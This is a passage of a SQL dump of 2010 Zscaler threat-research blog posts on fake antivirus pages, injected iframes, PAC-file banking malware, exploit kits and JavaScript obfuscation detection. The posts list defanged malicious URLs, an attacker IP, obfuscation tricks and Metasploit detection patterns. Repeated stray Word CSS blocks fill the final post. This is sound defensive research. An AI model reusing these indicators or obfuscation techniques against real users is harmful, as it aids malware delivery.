malicious, which is still better than the 9 out of 41 I saw earlier, or even 2 out of 41 not long ago.         The two malicious domains have been reported to Google and should be blocked on Firefox and Chrome at this time.         If you do the same search on Bing, none of the links within the search results are malicious.         -- Julien', 'AntiVirus;Microsoft', 'https://www.zscaler.com/blogs/research/fake-antivirus-your-blacklist-and-antivirus-do-not-protect-you');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (518, 'Philippine Yellow Pages Hacked', 'Julien Sobrier', 'May 25, 2010', 'Following on the wave of  \"iepeers.dll\" exploits, we found that the same client IP address involved in the attacks, used an open proxy to reach thousands of pages containing IE6 exploits. These consisted of legitimate sites which had been hacked and the following Javascript code had been injected into the pages:Obfuscated malicious JavascriptThe code is well obfuscated - it is different on each of the hacked sites and uses exceptions and eval functions to break deofuscation tools. The code is obfuscated several times, and does not do any document.write functions, all of which can make the script more difficult to decode. In the end, the script adds an invisible iframe to a Russian (.ru) website on port 8080. The domain name used by the iframe varies.Fortunately, the author went too far with the obfuscation, and it is actually fairly easy to recognize the obfuscated code. We wrote a few signatures last week to catch sites hijacked with this code. Among the  hacked sites, we found that the Philippine Yellow Pages: http://yellowpageph.com/ had been successfully attacked. I have checked several pages on the site and only the home page seems to be infected.Invisible iframe to tenthprofit.ru:8080We\'ve seen this malicious code on all kinds of websites, but the URL used on this Yellow Pages site is interesting: hxxp://tenthprofit.ru:8080/google.com/live.com/pagesjaunes.fr.php (the URL is inaccessible at this time). \"pagejaunes\" is French for Yellow Pages. This may just be a coincidence...I have contacted the website, it may be cleaned up at the time this post is published.-- Julien', 'Analysis', 'https://www.zscaler.com/blogs/research/philippine-yellow-pages-hacked');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (519, 'Fake AV Copycat?', 'Julien Sobrier', 'May 24, 2010', 'Malicious fake antivirus pages are pretty much all the same, with very straightforward code, which makes them relatively easy to detect. Most of these pages are also found just a few domains (mostly on sub-domains of xorg.pl, although the predominance of this domain has decreased lately), which makes blacklisting possible (although not the best protection).The \"original\" fake AV page is made of:a simple HTML page which displays a warning about your PC being infected, and displays a splash screen. The page title is always the same, as well as the text displayed, while the page is loading. The main page is displayed only if you come from a hacked site, direct access to the page will provide a 404 \'page not found\' error. Your PC might be infected!Page loading...an external Javascript file called from the main HTML page. This Javascript file contains the actual fake AV page with style sheets, images, animations, etc. It is not obfuscated.  Page fully loaded Different display, but almost identical HTML and Javascript codethe malicious executable is downloaded after the animation has completed, or when the user attempts to close the pageRecently however, I\'ve seen new versions of this fake AV page start to emerge. Visually, they look the same, but they use Javascript obfuscation, and leverage new domains. Most of these new pages were not blocked by Google SafeBrowsing, even several days after we first first encountered them.Instead of using one HTML page and an external Javascript file, all the code is on the landing page. The obfuscation uses base64 encoding in addition to custom code. It is fairly easy to decode, as it does not use eval, exceptions, DOM inspections or other tricks that break most of the obfuscation tools such as Malzilla. Once deobfuscated, the source code is very similar to what can be found in the Javascript file described above.In addition to the code obfuscation, the page title as well as the waiting text are a little bit different from the original fake AV page. The malicious payload is detected by only 6 AV vendors out of 41. Another sample that I discovered was detected by only 2 AV vendors!Are these new pages the work of copycats, or the next evolution from the same group of attackers? To me, it looks more like a different group of people applied simple Javascript obfuscation around the work done by others.-- Julien', 'Analysis;Malware;AntiVirus', 'https://www.zscaler.com/blogs/research/fake-av-copycat');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (520, 'Banking Malware Uses PAC File', 'ThreatLabz', 'May 20, 2010', 'There have been a few recent posts (1, 2) of malware that set and use proxy auto-config (PAC) files to steal victim banking credentials. I thought this was interesting and decided to write a quick post on this. PAC files provide the ability to auto configure proxy settings for your browser, including the ability to configure proxy settings on a per URL basis. DNS Changer malware has been around for awhile, in which victim\'s hosts file and/or DNS server settings are altered to have banking and other sites resolve to attacker controlled servers hosting malicious or phishing content. In the PAC malware, the victim\'s browser uses a proxy setting for the targeted URLs to the attacker controlled server.    Here is a malware report from today that conducts PAC configuration on a victims machine. Below is a screenshot of the malware\'s logic that configures the PAC file. It sets the registry key:  Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings with an AutoConfigURL value.    This malware example, configures the victim to use the PAC file on:           hxxp://dns.configdeskwork.com:8099/workwindows.pac     FQDN resolution:                dns.configdeskwork.com. 1800 IN A 208.64.66.170      As previously mentioned, PAC files enable proxy settings on a per URL basis. This particular PAC file redirects traffic to the attacker\'s host (208.64.66.170) for a number of Brazilian sites and American Express. Below is a screenshot of the PAC file:', 'Abuse', 'https://www.zscaler.com/blogs/research/banking-malware-uses-pac-file');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (521, 'Spike Of \"iepeers.dll\" Exploits', 'Julien Sobrier', 'May 18, 2010', 'We have seen a spike in exploits using  the CVE-2010-0806 \"iepeers.dll\" vulnerability since this past weekend. The vulnerability affects Internet Explorer 6 and 7.We have seen this exploit in the wild since that day, usually a few times a week. However, this past weekend, we witnessed a spike of several hundreds exploits a day. They all come from the same type of URL (hxxp://1269754898890.9934.eu.tv/mm/index.html) with different numbers for the sub-domains. The content of the malicious pages is exactly the same.The code is well obfuscated - it is split between several files, uses eval, DOM references, and exceptions (try ... catch). From the information I could gather, the exploit page has been written by Chinese hackers to target Chinese users. Part of the intermediate code generated is written with Chinese characters. Samples of the exploits have been reported in a couple of Chinese forums. It seems that users get redirected to the exploits from other websites, mainly though hacked sites.Here is what the original source code looks like:Source code of the \"iepeers.dll\" exploits used in recent attacksThe page does not require any user interaction. The exploit runs as soon as the user gets redirected to this page.-- Julien', 'Analysis;Microsoft;Exploit Kit;Vulnerability', 'https://www.zscaler.com/blogs/research/spike-iepeersdll-exploits');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (522, 'SEO Spam Research', 'Julien Sobrier', 'May 17, 2010', 'Hacked sites may have their pages modified with invisible IFRAMES or malicious JavaScript, or new dynamic pages are created to redirect users to a fake anti-virus page or a scam. In some cases, new folders are created, and filled with hundreds or thousands of Search Engine Optimization (SEO) page spams. These pages are intended to score well with popular searches. They contains links to other domains, either malware sites or scams. This post from Sucuri Security reports that recently hacked websites contains a .files/ folder filled with such SEO spam.    With the help of Google, it easy to find a list of these hidden folders. Look for \"\"index of .files/\" and one example of a file listed in the blog post, for example \"2009 pro bowl.html\": \"index of .files/\" 2009 pro bowl.html. Now you have access to hundred of pages set up by attackers. This is a very valuable source of information to understand how attackers are using SEO, and which domains names are involved in the attack.    All the pages have the same structure, but are actually quite different from the SEO spam pages I saw before:      	each page targets a particular search (for example, 2010 Winter Olympics), as usual  	the page alternates one paragraph of text, and one link (unusual, there are usually very few links)  	each link text has nothing to do with the content of the page (unusual)  	each link points to a different domain: fng-international.com, achaemprego.projects.heavyworks.ne, aceuplink.net, etc.                               SEO spam page      The links redirects to different types of sites: fake antivirus pages, fake search engines to scam advertising networks, etc. Some of the links do not redirect all users to malicious sites, but only those who come from a Google/Yahoo/Bing search.    The list of file names also shows which topics are targeted by the attacker: pretty much anything! Winter Olympics, the latest Google phones, celebrities, Apple news, how to write a sonnet (!), home sales, etc.    From these files, we gathered 27,453 unique URLs from 96 different domains. This will keep me busy for a while :-)    -- Julien', 'Uncategorised', 'https://www.zscaler.com/blogs/research/seo-spam-research');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (523, 'Adobe Groups Abused', 'ThreatLabz', 'May 17, 2010', 'We\'ve seen Google Groups and a host of other sites that permit user driven content to redirect to malware or other nonsense.  This morning I saw a rash of Adobe Groups posts redirecting to fake pharmacy sites (pharms / pills sites).  For example:hxxp://groups.adobe.com/index.cfm?event=post.display&postid=22600... most all postids between (that\'s more than 2K posts!) ...hxxp://groups.adobe.com/index.cfm?event=post.display&postid=25000Users that follow the links visit a page that looks like:Clicking on the advertisement takes you to the pharm redirector:hxxp://online-shop24h.com/shop/go.php?sid=133 (has groups.adobe.com referer)302 redirects to the pharm: hxxp://www.best-medshop.com (USID tracking cookie is set)online-shop24h.com domain registration info:best-medshop.com domain registration info:The lesson here is that if you or your company is going to start a \"Groups\" page (or any site that allows user driven content to be published onto your site), you need to have a mechanism in place to validate the content / prevent this sort of abuse.  I sent a note to Adobe notifying them of this problem.', 'Abuse', 'https://www.zscaler.com/blogs/research/adobe-groups-abused');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (524, '300% Increase In Malicious JARs', 'ThreatLabz', 'May 14, 2010', 'While doing some stats & trends on our data, I noticed that there has been a steady rise in the number of malicious Java Archive (JAR) files that we are blocking (pulling data from both within our logs and blacklists). While malicious JAR files remain a relatively small threat volume for our users (<100 incidents a month), roughly speaking there has been about a 300% increase in malicious JAR files per month observed from January 2010 to present. While our data is a small subset of the Internet as a whole, from the increases that I am seeing in our logs and the increased chatter on malicious JARs within security mailing lists, I believe it is safe to say that there has been an overall increase in malicious JARs on the Internet. There are a number of reasons supporting this increase, including:           	Inclusion of JAVA exploits (for example, CVE-2008-5353 and CVE-2009-3867) within popular exploit kits (for example, Pheonix2, Eleonore, and Liberty)  	Usage of JARs to obfuscate and redirect to malicious payloads (I used the DJ decompiler to analyze one of these the other day)  	Tavis Ormandy\'s April 2010 discovery of the Java Web Start Argument Injection Vulnerability (Full Disclosure posting)  	Adoption of the Java Signed Applet exploit (Metasploit rev. 8267, Java Applet Infection post)      Trojan executables, malicious PDFs, and browser exploits are much more prevalent than exploits against Java/JRE - but it will be interesting to continue to monitor this trend.', 'Uncategorised', 'https://www.zscaler.com/blogs/research/300-increase-malicious-jars');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (525, 'Deep Javascript Obfuscation Can Make Exploits Easier To Detect', 'Julien Sobrier', 'May 13, 2010', 'UPDATE: AVG displayed false alerts about the obfuscated Javascript codes samples displayed in the post. These samples are all harmless. I have replaced these codes samples with screenshots.\r\n\r\n\r\nMinification, packing, obfuscation\r\n\r\nJavascript code is usually pre-processed before it is served to users in order to make it smaller, resulting in a faster page load times, or to obfuscate it.\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\nfunction add(one, two) {\r\n    return one + two;\r\n}\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\nAn example of original source code\r\n\r\n\r\nMinifier\r\n\r\nThe most common form of pre-processing involves minification. The source code is stripped of white space, comments, etc., in order to make it more compact. Some minifiers can also rename internal variables to make them shorter. The minified Javascript is less readable for humans, but not to automation tools or security scanners. It is a common practice to serve minified Javascript either inline, as part of an HTML page, or in external sites, to reduce the loading time of pages. Google, Amazon, and most major websites use this technique.\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\nfunction add(a,b){return a+b}\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\nExample of minified Javascript\r\n\r\n\r\nPacker\r\n\r\nThen webmasters try to go further and additionally reduce code size by leveraging packers, such as using a base64 encoding. The source code is endoded in the new base, and decoded through Javascript in the browser. This results in a smaller code (if the original code is not too short) that is harder for humans to interpret and often harder for security tools to inspect.\r\n\r\nPacked Javascript is not widely used because the smaller file size is balanced by a longer execution time in the browser to decode the Javascript.\r\n\r\n \r\n\r\n \r\n\r\n\r\n\r\n\r\nExample of packed Javascript (line break inserted for readability)\r\n\r\n \r\n\r\nObfuscator\r\n\r\nObfuscation is done for the sole purpose of \"hiding\" the original code. Obfuscated code often results in a larger code size than that of unprocessed Javascript. The resulting code is unreadable by humans, and once again, complicates parsing for security scanners. A slight code change in the original code can also create a completely different set of obfuscated Javascript. That means an attacker can create many versions of the same original code and each will look very different from the others.\r\n\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\n\r\n\r\nExample of lightly obfuscated Javascript\r\n\r\n\r\nObfuscated exploits\r\n\r\nThere are legitimate uses of obfuscated Javascript. For example, obfuscation can be used to hide e-mail addresses from web crawlers. Obfuscation is also commonly used by many advertising networks.\r\n\r\nBut Javascript obfuscation is widely used for malicious purposes. Attackers obfuscate their exploits to bypass security tools. They can also easily change the code on each site they infect, so that one detected malicious page does not result in all other exploited pages being detected.\r\n\r\nSometimes however, extreme obfuscation can make it easier to detect malicious code. When Javascript looks very different from minified, packed or even common obfuscation code patterns, they really stand out. It is sometimes easier to detect the obfuscation itself rather than the underlying exploit.\r\n\r\nMetasploit is a popular and powerful exploitation framework, which includes a number of browser exploits. It goes to great lengths to obfuscate the exploits: most variables are generated randomly for each run and the Javascript code is heavily obfuscated overall. As a result, Metasploit generated HTML code can really stand out:\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\n	the code density is unusual: they have very long variable names, spaces at the beginning of lines, several line breaks in a row, etc.\r\n	repeatable patterns\r\n	\r\n		most ActiveX objects are called with new ActiveXObject(String.fromCharCode(\r\n		reassignment of the unescape Javascript function to a variable: <...> = unescape;\r\n		the decoding loop uses some unusual pieces of code: .toString(16); unescape(unescape(, etc.\r\n	\r\n	\r\n\r\n\r\nas a result, it can actually become easier to detect the exploits coming from Metasploit. We\'ve seen other examples where the attacker goes a little too far to obfuscate his code, and actually make it easier to recognize.\r\n\r\nObfuscation done right can make it harder to detect and understand exploits. Crazy obfuscation does the opposite.\r\n\r\n-- Julien', 'Analysis;Exploit Kit', 'https://www.zscaler.com/blogs/research/deep-javascript-obfuscation-can-make-exploits-easier-detect');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (526, 'Inline Detection Of Evil JavaScript', 'ThreatLabz', 'May 11, 2010', 'Exploit kits are a much more common threat on the web than they used to be.  In order to evade detection, the kits frequently contain logic to obfuscate, or hide, the meaning behind the content that they serve to the victim.  Additionally, with each visit to the exploit page, the obfuscation techniques will differ slightly so that static, content signatures will be unable to detect the threat.  Other threats contain obfuscated JavaScript (JS) which sets up the page to exploit a vulnerability and launch a payload (for example, \"spraying\" the heap with shellcode).  Still other threats inject obfuscated JS into legitimate sites, which after decoding embeds a hidden (0-pixel) IFrame to malicious content.  As we have seen in the past, the JS encodings vary greatly with each incident, and many instances are encoded multiple times and may contain non-standard JS (reference past blog posts, such as \"More and more obfuscation being used in the malicious scripts\").  While some signatures have been written for things like generic heap spraying and other maliciousness within obfuscated JS, the bad guys are constantly updating their tactics to evade detection.  Anyway, the point that I\'m getting at is that scalable (think ISP), inline deobfuscation of JS is something that is *very* difficult to implement.One way of coping with this problem is to implement a number of efficient checks to analyze and score the JS inline for likelihood of maliciousness (JS heuristic).  Pages that meet a certain score threshold may have additional inspections done or the page may be blocked outright.  After doing some research and testing against some malicious and benign sites, I came up with a small number of checks that can be implemented inline and also produced some compelling results.  While I won\'t divulge all of the \"secret sauce\", I wanted to share two pretty interesting checks that I\'m doing against JS.Shannon Entropy ScoringEntropy is the \"measure of how organized or disorganized a system is\" (wikipedia) - in other words, it is the amount of randomness in something.  Shannon entropy is expressed in terms of probabilities, which describes the the number of yes/no questions (bits) needed to determine the content of a message (the more entropy in a message, the more questions required).Shannon entropy is expressed as:Where p(xi) is the probability of the xi sequence being in the message contents.After analyzing a number of benign versus malicious websites, I found that the vast majority of benign sites had an entropy score between 5 and 6.  For example,.nobr br { display: none }SiteURLEntropy ScoreGoogle Search Results Pagehttp://www.google.com/search?q=test5.59684041594171CNN Home Pagehttp://www.cnn.com/5.38281304867348YouTube Video Pagehttp://www.youtube.com/watch?v=YjZR1Rjj_p05.64757689191574Zscaler Bloghttp://research.zscaler.com/5.1860122562664Slashdothttp://slashdot.org/5.24109568818941Facebookhttp://www.facebook.com/5.44626483954319Yahoohttp://www.yahoo.com/5.66647432819298Twitterhttp://twitter.com/5.07852673859431Binghttp://www.bing.com/5.70730460609158Weatherhttp://www.weather.com/5.46749072998571The above 10 pages had an average entropy score of: 5.44203995.I pulled a number of malicious pages from MDL, MalwareURL, BLADE, and Zscaler\'s block logs.  There was a larger diversity of entropy scoring, but what I noticed were a lot of results that scored outside of the 5-6 range that was popular for the benign sites. For example,.nobr br { display: none }SiteURLEntropy ScorePheonix Exploit Kithxxp://cupidplaces.com/des/index.php6.07314762971744Eleonore Exploit Kit 1.3.2hxxp://godaddynon.com/31337/frv/index.php3.42515527587734Eleonore Exploit Kit 1.4hxxp://russian-post.net/otop/index.php4.35195257602932Pheonix Exploit Kithxxp://grinchalina5.com/pek/5.41711832747246Injected obfuscated JShxxp://123celebritygossip.com/top-celebrity-biographies5.16329257317279YES Exploit Kit 3.0hxxp://img127.imageshack.uz/start.php6.07918073457686Exploithxxp://www.hao123.com.wwvv.us/images/css/jg.htm2.6484961921375NeoSploithxxp://sun.akkei.com/cgi-bin/engine.aspx5.36941875592612IE Exploit CVE-2010-0249hxxp://www.12388.info:778/ie.html4.71645042977322Fragus Exploit Kithxxp://79.39.52.17:555/counter/show.php3.35759918809499Seven out of the above sample 10 malicious URLs fell outside the entropy range for the benign sites.  The benign websites generally contained English content.  The English alphabet has more entropy (upper/lower 26 letters, numbers, punctuation) than content that is made up of mostly Hex or encoded bytes (e.g., 0-9A-F).  This is visible within the hao123.com exploit page, that has a very low entropy score.  Some exploit kits used a larger and \"more random\" pool of characters in their encodings, variable names, etc. - these sites resulted in higher entropy scores.JavaScript \"Density\" ScoringExploit kits and exploit pages frequently store large blocks of encoded content into variables that are then processed by the script to result in the exploit, shellcode, redirect, or other content.  These large blocks of content make the JS for these pages more \"dense\" than JS found in typical websites.  By calculating the average character sequence size I am able to apply a numerical \"density\" score to the script content.  There is one problem with just separating character sequences by whitespace- a lot of JS has whitespace removed to save bandwidth (this is called JS minification), thus I also separate character sequences by a handful of JS characters, such as =;(){}.Applying density scoring on the same malicious versus benign sites above resulted in the benign sites having an average density score of 13.6808922 while the malicious sites had an average of 42.3847881.  Needless to say, there was a large disparity in the JS density between the malicious and benign sites that I tested.ConclusionsDeobfuscating all JS within webpages as they fly across the wire is not very scalable.  However, some techniques can be used to identify risky, or potentially malicious, obfuscated JS in realtime.  This provides a smaller subset of JS to further analyze inline or block based upon thresholding.  Preliminary results of some techniques, such as entropy and density scoring have produced some promising results.  By releasing these results to the community, I hope to encourage others to conduct analysis and share their work/results for scalable solutions for inline JS analysis besides simple signatures.  Below are some screenshots of an internal proof-of-concept that I built using the previously mentioned checks.Exploit site example:Benign site example:', 'Analysis;Exploit Kit', 'https://www.zscaler.com/blogs/research/inline-detection-evil-javascript');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (527, 'More And More Obfuscation Being Used In The Malicious Scripts', 'ThreatLabz', 'May 07, 2010', 'As we saw in a previous blog post, malicious, obfuscated JavaScript is being injected into legitimate webpages. Attackers not only use simple obfuscation techniques, but also leverage rather complex approaches to hide their malicious code. In another recent blog, we saw how attackers have used publicly available Base64 encoding techniques to hide their malicious code. This is often done to evade Antivirus detection. Recently, we discovered yet another heavy obfuscation technique. Automated deobfuscation tools/services such as Webpawet and Malzilla were challenged by this particular sample. Here is the malicious code prior to being deobfuscated.   <!--  /* Font Definitions */  @font-face 	{font-family:\"Cambria Math\"; 	panose-1:2 4 5 3 5 4 6 3 2 4; 	mso-font-charset:0; 	mso-generic-font-family:roman; 	mso-font-pitch:variable; 	mso-font-signature:-1610611985 1107304683 0 0 159 0;} @font-face 	{font-family:Calibri; 	panose-1:2 15 5 2 2 2 4 3 2 4; 	mso-font-charset:0; 	mso-generic-font-family:swiss; 	mso-font-pitch:variable; 	mso-font-signature:-1610611985 1073750139 0 0 159 0;} @font-face 	{font-family:\"Geeza Pro\"; 	mso-font-alt:\"Times New Roman\"; 	mso-font-charset:0; 	mso-generic-font-family:roman; 	mso-font-pitch:auto; 	mso-font-signature:0 0 0 0 0 0;}  /* Style Definitions */  p.MsoNormal, li.MsoNormal, div.MsoNormal 	{mso-style-unhide:no; 	mso-style-qformat:yes; 	mso-style-parent:\"\"; 	margin-top:0in; 	margin-right:0in; 	margin-bottom:10.0pt; 	margin-left:0in; 	line-height:115%; 	mso-pagination:widow-orphan; 	font-size:11.0pt; 	font-family:\"Calibri\",\"sans-serif\"; 	mso-ascii-font-family:Calibri; 	mso-ascii-theme-font:minor-latin; 	mso-fareast-font-family:\"Times New Roman\"; 	mso-fareast-theme-font:minor-fareast; 	mso-hansi-font-family:Calibri; 	mso-hansi-theme-font:minor-latin; 	mso-bidi-font-family:\"Times New Roman\"; 	mso-bidi-theme-font:minor-bidi;} .MsoChpDefault 	{mso-style-type:export-only; 	mso-default-props:yes; 	mso-ascii-font-family:Calibri; 	mso-ascii-theme-font:minor-latin; 	mso-fareast-font-family:\"Times New Roman\"; 	mso-fareast-theme-font:minor-fareast; 	mso-hansi-font-family:Calibri; 	mso-hansi-theme-font:minor-latin; 	mso-bidi-font-family:\"Times New Roman\"; 	mso-bidi-theme-font:minor-bidi;} .MsoPapDefault 	{mso-style-type:export-only; 	margin-bottom:10.0pt; 	line-height:115%;} @page Section1 	{size:8.5in 11.0in; 	margin:1.0in 1.0in 1.0in 1.0in; 	mso-header-margin:.5in; 	mso-footer-margin:.5in; 	mso-paper-source:0;} div.Section1 	{page:Section1;} -->   As can be seen, Malzilla was unable to manually analyze the code. <!--  /* Font Definitions */  @font-face 	{font-family:\"Cambria Math\"; 	panose-1:2 4 5 3 5 4 6 3 2 4; 	mso-font-charset:0; 	mso-generic-font-family:roman; 	mso-font-pitch:variable; 	mso-font-signature:-1610611985 1107304683 0 0 159 0;} @font-face 	{font-family:Calibri; 	panose-1:2 15 5 2 2 2 4 3 2 4; 	mso-font-charset:0; 	mso-generic-font-family:swiss; 	mso-font-pitch:variable; 	mso-font-signature:-1610611985 1073750139 0 0 159 0;} @font-face 	{font-family:\"Geeza Pro\"; 	mso-font-alt:\"Times New Roman\"; 	mso-font-charset:0; 	mso-generic-font-family:roman; 	mso-font-pitch:auto; 	mso-font-signature:0 0 0 0 0 0;}  /* Style Definitions */  p.MsoNormal, li.MsoNormal, div.MsoNormal 	{mso-style-unhide:no; 	mso-style-qformat:yes; 	mso-style-parent:\"\"; 	margin-top:0in; 	margin-right:0in; 	margin-bottom:10.0pt; 	margin-left:0in; 	line-height:115%; 	mso-pagination:widow-orphan; 	font-size:11.0pt; 	font-family:\"Calibri\",\"sans-serif\"; 	mso-ascii-font-family:Calibri; 	mso-ascii-theme-font:minor-latin; 	mso-fareast-font-family:\"Times New Roman\"; 	mso-fareast-theme-font:minor-fareast; 	mso-hansi-font-family:Calibri; 	mso-hansi-theme-font:minor-latin; 	mso-bidi-font-family:\"Times New Roman\"; 	mso-bidi-theme-font:minor-bidi;} .MsoChpDefault 	{mso-style-type:export-only; 	mso-default-props:yes; 	mso-ascii-font-family:Calibri; 	mso-ascii-theme-font:minor-latin; 	mso-fareast-font-family:\"Times New Roman\"; 	mso-fareast-theme-font:minor-fareast; 	mso-hansi-font-family:Calibri; 	mso-hansi-theme-font:minor-latin; 	mso-bidi-font-family:\"Times New Roman\"; 	mso-bidi-theme-font:minor-bidi;} .MsoPapDefault 	{mso-style-type:export-only; 	margin-bottom:10.0pt; 	line-height:115%;} @page Section1 	{size:8.5in 11.0in; 	margin:1.0in 1.0in 1.0in 1.0in; 	mso-header-margin:.5in; 	mso-footer-margin:.5in; 	mso-paper-source:0;} div.Section1 	{page:Section1;} -->    It was clear that this code would require manual analysis. I saw some eval() functions being used in the script at the bottom. I tried to replace eval() with alert(), document.write(), etc. In order to help with debugging, but I didn’t achieve what I was looking for. Now, it’s the time to do step by step analysis of the code in order to gain a deeper understanding of the logic. Let’s now start reading the code step by step. First, we break the script and format the code so that it is readable. Below are the screenshots of the part 1 of the script: <!--  /* Font Definitions */  @font-face 	{font-family:\"Cambria Math\"; 	panose-1:2 4 5 3 5 4 6 3 2 4; 	mso-font-charset:0; 	mso-generic-font-family:roman; 	mso-font-pitch:variable; 	mso-font-signature:-1610611985 1107304683 0 0 159 0;} @font-face 	{font-family:Calibri; 	panose-1:2 15 5 2 2 2 4 3 2 4; 	mso-font-charset:0; 	mso-generic-font-family:swiss; 	mso-font-pitch:variable; 	mso-font-signature:-1610611985 1073750139 0 0 159 0;} @font-face 	{font-family:\"Geeza Pro\"; 	mso-font-alt:\"Times New Roman\"; 	mso-font-charset:0; 	mso-generic-font-family:roman; 	mso-font-pitch:auto; 	mso-font-signature:0 0 0 0 0 0;}  /* Style Definitions */  p.MsoNormal, li.MsoNormal, div.MsoNormal 	{mso-style-unhide:no; 	mso-style-qformat:yes; 	mso-style-parent:\"\"; 	margin-top:0in; 	margin-right:0in; 	margin-bottom:10.0pt; 	margin-left:0in; 	line-height:115%; 	mso-pagination:widow-orphan; 	font-size:11.0pt; 	font-family:\"Calibri\",\"sans-serif\"; 	mso-ascii-font-family:Calibri; 	mso-ascii-theme-font:minor-latin; 	mso-fareast-font-family:\"Times New Roman\"; 	mso-fareast-theme-font:minor-fareast; 	mso-hansi-font-family:Calibri; 	mso-hansi-theme-font:minor-latin; 	mso-bidi-font-family:\"Times New Roman\"; 	mso-bidi-theme-font:minor-bidi;} .MsoChpDefault 	{mso-style-type:export-only; 	mso-default-props:yes; 	mso-ascii-font-family:Calibri; 	mso-ascii-theme-font:minor-latin; 	mso-fareast-font-family:\"Times New Roman\"; 	mso-fareast-theme-font:minor-fareast; 	mso-hansi-font-family:Calibri; 	mso-hansi-theme-font:minor-latin; 	mso-bidi-font-family:\"Times New Roman\"; 	mso-bidi-theme-font:minor-bidi;} .MsoPapDefault 	{mso-style-type:export-only; 	margin-bottom:10.0pt; 	line-height:115%;} @page Section1 	{size:8.5in 11.0in; 	margin:1.0in 1.0in 1.0in 1.0in; 	mso-header-margin:.5in; 	mso-footer-margin:.5in; 	mso-paper-source:0;} div.Section1 	{page:Section1;} -->   There are plenty of random variables defined initially and then one array is defined as “var sYvxoe19wg=new Array(); “. Now for each variable, the characters are being XOR\'d with random numbers and then the variables are concatenated in the array defined earlier.    for (var aRjNtT8j=0;aRjNtT8j   {            iSOi16qif48Q1[aRjNtT8j]=iSOi16qif48Q1[aRjNtT8j]^25;   };   sYvxoe19wg=sYvxoe19wg.concat(iSOi16qif48Q1);  This means the array will complete after XOR’ing 21 variables and concatenating them in the array. This array should be passed to some function to parse this. Let’s open second part of the script,    <!--  /* Font Definitions */  @font-face 	{font-family:\"Cambria Math\"; 	panose-1:2 4 5 3 5 4 6 3 2 4; 	mso-font-charset:0; 	mso-generic-font-family:roman; 	mso-font-pitch:variable; 	mso-font-signature:-1610611985 1107304683 0 0 159 0;} @font-face 	{font-family:Calibri; 	panose-1:2 15 5 2 2 2 4 3 2 4; 	mso-font-charset:0; 	mso-generic-font-family:swiss; 	mso-font-pitch:variable; 	mso-font-signature:-1610611985 1073750139 0 0 159 0;}  /* Style Definitions */  p.MsoNormal, li.MsoNormal, div.MsoNormal 	{mso-style-unhide:no; 	mso-style-qformat:yes; 	mso-style-parent:\"\"; 	margin-top:0in; 	margin-right:0in; 	margin-bottom:10.0pt; 	margin-left:0in; 	line-height:115%; 	mso-pagination:widow-orphan; 	font-size:11.0pt; 	font-family:\"Calibri\",\"sans-serif\"; 	mso-ascii-font-family:Calibri; 	mso-ascii-theme-font:minor-latin; 	mso-fareast-font-family:\"Times New Roman\"; 	mso-fareast-theme-font:minor-fareast; 	mso-hansi-font-family:Calibri; 	mso-hansi-theme-font:minor-latin; 	mso-bidi-font-family:\"Times New Roman\"; 	mso-bidi-theme-font:minor-bidi;} .MsoChpDefault 	{mso-style-type:export-only; 	mso-default-props:yes; 	mso-ascii-font-family:Calibri; 	mso-ascii-theme-font:minor-latin; 	mso-fareast-font-family:\"Times New Roman\"; 	mso-fareast-theme-font:minor-fareast; 	mso-hansi-font-family:Calibri; 	mso-hansi-theme-font:minor-latin; 	mso-bidi-font-family:\"Times New Roman\"; 	mso-bidi-theme-font:minor-bidi;} .MsoPapDefault 	{mso-style-type:export-only; 	margin-bottom:10.0pt; 	line-height:115%;} @page Section1 	{size:8.5in 11.0in; 	margin:1.0in 1.0in 1.0in 1.0in; 	mso-header-margin:.5in; 	mso-footer-margin:.5in; 	mso-paper-source:0;} div.Section1 	{page:Section1;} -->   Now we are a little closer to decoding this script. We have the final array and we then call one function with the array as an argument. First, add “alert(sYvxoe19wg)” to the array before calling the function to see if we get the final array() and copy it using Ctrl + C from the message box. Here is what it looks like: <!--  /* Font Definitions */  @font-face 	{font-family:\"Cambria Math\"; 	panose-1:2 4 5 3 5 4 6 3 2 4; 	mso-font-charset:0; 	mso-generic-font-family:roman; 	mso-font-pitch:variable; 	mso-font-signature:-1610611985 1107304683 0 0 159 0;} @font-face 	{font-family:Calibri; 	panose-1:2 15 5 2 2 2 4 3 2 4; 	mso-font-charset:0; 	mso-generic-font-family:swiss; 	mso-font-pitch:variable; 	mso-font-signature:-1610611985 1073750139 0 0 159 0;} @font-face 	{font-family:\"Geeza Pro\"; 	mso-font-alt:\"Times New Roman\"; 	mso-font-charset:0; 	mso-generic-font-family:roman; 	mso-font-pitch:auto; 	mso-font-signature:0 0 0 0 0 0;}  /* Style Definitions */  p.MsoNormal, li.MsoNormal, div.MsoNormal 	{mso-style-unhide:no; 	mso-style-qformat:yes; 	mso-style-parent:\"\"; 	margin-top:0in; 	margin-right:0in; 	margin-bottom:10.0pt; 	margin-left:0in; 	line-height:115%; 	mso-pagination:widow-orphan; 	font-size:11.0pt; 	font-family:\"Calibri\",\"sans-serif\"; 	mso-ascii-font-family:Calibri; 	mso-ascii-theme-font:minor-latin; 	mso-fareast-font-family:\"Times New Roman\"; 	mso-fareast-theme-font:minor-fareast; 	mso-hansi-font-family:Calibri; 	